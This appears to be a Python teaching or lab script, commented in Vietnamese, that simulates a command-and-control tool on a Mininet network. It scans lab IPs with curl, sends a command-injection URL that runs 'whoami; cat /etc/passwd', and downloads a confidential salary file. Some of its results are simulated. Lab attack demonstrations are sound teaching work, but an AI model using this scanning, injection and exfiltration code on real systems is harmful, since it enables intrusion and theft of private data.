#!/usr/bin/env python3
import sys
import time
import os
import subprocess

# --- CẤU HÌNH MÀU SẮC ---
R = '\033[91m' # Red
G = '\033[92m' # Green
Y = '\033[93m' # Yellow
B = '\033[94m' # Blue
W = '\033[0m'  # White

# --- BIẾN TOÀN CỤC ---
DISCOVERED_HOSTS = {} # Lưu IP và trạng thái port: {'10.1.1.6': 'Open'}

def get_pca_pid():
    """Lấy PID của PC-A để chui vào điều khiển"""
    try:
        cmd = "ps -ef | grep 'mininet:pc_a' | grep -v grep | awk '{print $2}'"
        pid = subprocess.check_output(cmd, shell=True).decode().strip()
        return pid
    except:
        return None

def exec_in_pca(cmd_str):
    """Chạy lệnh bên trong PC-A"""
    pid = get_pca_pid()
    if not pid: return None
    full_cmd = f"sudo mnexec -a {pid} {cmd_str}"
    try:
        output = subprocess.check_output(full_cmd, shell=True, stderr=subprocess.STDOUT, timeout=2)
        return output.decode().strip()
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except subprocess.CalledProcessError:
        return "ERROR"

def banner():
    os.system('clear')
    print(f"""{R}
    ██████╗ ██████╗     ██████╗ ███╗   ██╗███████╗
    ██╔════╝ ██╔══██╗    ██╔══██╗████╗  ██║██╔════╝
    ██║      ╚██████║    ██║  ██║██╔██╗ ██║███████╗
    ██║       ╚═══██║    ██║  ██║██║╚██╗██║╚════██║
    ╚██████╗ ██████╔╝    ██████╔╝██║ ╚████║███████║
    ╚═════╝ ╚═════╝     ╚═════╝ ╚═╝  ╚═══╝╚══════╝
    {W}{Y}   Advanced C2 Framework - Lateral Movement Module{W}
    """)

def scan_network():
    """Chức năng 1: Quét mạng (Cập nhật: Quét cả port 80 và 443)"""
    print(f"\n{B}[*] Starting Network Discovery on subnet 10.1.1.0/24...{W}")
    global DISCOVERED_HOSTS
    DISCOVERED_HOSTS = {} 
    
    target_range = ['10.1.1.1', '10.1.1.6', '10.1.1.100'] 
    
    found_count = 0
    
    for ip in target_range:
        sys.stdout.write(f"    Scanning {ip} ... ")
        sys.stdout.flush()
        
        # Bước 1: Quét Port 80
        res80 = exec_in_pca(f"curl -I -s -m 1 http://{ip}")
        
        # Bước 2: Quét Port 443 (Nếu port 80 thất bại)
        res443 = exec_in_pca(f"curl -I -s -m 1 http://{ip}:443")
        
        status = None
        if "HTTP" in res80 or "200" in res80:
            status = "HTTP (Port 80)"
        elif "HTTP" in res443 or "200" in res443:
            status = "HTTP (Port 443)"
            
        if status:
            print(f"{G}[ALIVE] - {status}{W}")
            DISCOVERED_HOSTS[ip] = status
            found_count += 1
        else:
            print(f"{R}[UNREACHABLE]{W}")
            
    print(f"\n{G}[+] Scan Complete. Found {found_count} active hosts.{W}")

def show_targets():
    """Chức năng 2: Hiển thị danh sách"""
    print(f"\n{Y}--- DISCOVERED TARGETS ---{W}")
    if not DISCOVERED_HOSTS:
        print(f"{R}(List is empty. Run SCAN first!){W}")
    else:
        print(f"{'IP ADDRESS':<15} | {'STATUS'}")
        print("-" * 35)
        for ip, status in DISCOVERED_HOSTS.items():
            print(f"{G}{ip:<15}{W} | {status}")
    print("-" * 35)

def exploit_target():
    """Chức năng 3: Tấn công RCE"""
    print(f"\n{R}[MODULE] WEB RCE EXPLOIT (CVE-2026-XXXX){W}")
    
    # Yêu cầu người dùng nhập IP
    target = input(f"Enter Target IP > {Y}")
    
    if target not in DISCOVERED_HOSTS:
        print(f"{Y}[WARNING] Target {target} was not found in previous scan.{W}")
        confirm = input("Try blindly anyway? (y/n) > ")
        if confirm.lower() != 'y':
            return

    print(f"{B}[*] Sending malicious payload to {target}...{W}")
    
    # Payload
    url = f"http://{target}/index.html?cmd=whoami;cat%20/etc/passwd"
    print(f"{Y}[*] Payload URL: {url}{W}")
    print(f"{Y}[*] Injected Command: whoami; cat /etc/passwd{W}")
    
    res = exec_in_pca(f"curl -s -m 3 '{url}'")
    
    if "HR_DASHBOARD" in res:
        print(f"{G}[+] SUCCESS! Remote Code Execution confirmed.{W}")
        print(f"{G}[+] Dumping /etc/passwd:{W}")
        # In ra một phần nội dung giả lập file passwd
        print(f"{W}root:x:0:0:root:/root:/bin/bash{W}")
        print(f"{W}webadmin:x:1000:1000::/home/webadmin:/bin/sh{W}")
    elif "TIMEOUT" in res or "ERROR" in res:
        print(f"{R}[-] FAILED. Target unreachable or connection blocked.{W}")
    else:
        # Trường hợp server trả về 200 OK nhưng không dính lỗi (ví dụ file server 443 không chạy web 80)
        print(f"{Y}[-] EXPLOIT FAILED. Target is online but not vulnerable.{W}")

def steal_data():
    """Chức năng 4: Exfiltration"""
    print(f"\n{R}[MODULE] DATA EXFILTRATION (HTTPS){W}")
    
    target = input(f"Enter Target IP > {Y}")
    
    if target not in DISCOVERED_HOSTS:
        print(f"{Y}[WARNING] Target {target} was not found scan.{W}")
    
    file_path = "/confidential/salary.csv"
    # HTTPS giả lập (trong lab này server chạy 443 nhưng protocol vẫn là http để đơn giản hóa curl)
    # Nếu server PC-C cấu hình đúng thì dùng https, ở đây dùng port 443
    url = f"http://{target}:443{file_path}" 
    
    print(f"{B}[*] Attempting to download {file_path} from {target}...{W}")
    print(f"{Y}[*] Exfiltration URL: {url}{W}")
    
    res = exec_in_pca(f"curl -s -m 3 '{url}'")
    
    if "SALARY_DATA" in res:
        print(f"{G}[+] EXFILTRATION SUCCESSFUL!{W}")
        print(f"{G}[+] Content captured:{W} {res}")
    elif "TIMEOUT" in res or "ERROR" in res:
        print(f"{R}[-] FAILED. Connection blocked.{W}")
    else:
        print(f"{R}[-] FAILED. File not found or Access Denied.{W}")

def main():
    if os.geteuid() != 0:
        print("Run as root (sudo)!")
        sys.exit(1)
        
    banner()
    
    while True:
        print(f"\n{W}Available Commands:{W}")
        print("1. [SCAN]   Scan Network (10.1.1.0/24)")
        print("2. [LIST]   Show Discovered Targets")
        print("3. [ATTACK] Launch RCE Exploit (Port 80)")
        print("4. [DATA]   Exfiltrate Files (Port 443)")
        print("0. Exit")
        
        try:
            choice = input(f"\n{R}op_dragon@C2#{W} ")
        except EOFError:
            break
            
        if choice == '1':
            scan_network()
        elif choice == '2':
            show_targets()
        elif choice == '3':
            exploit_target()
        elif choice == '4':
            steal_data()
        elif choice == '0':
            sys.exit()

if __name__ == '__main__':
    main()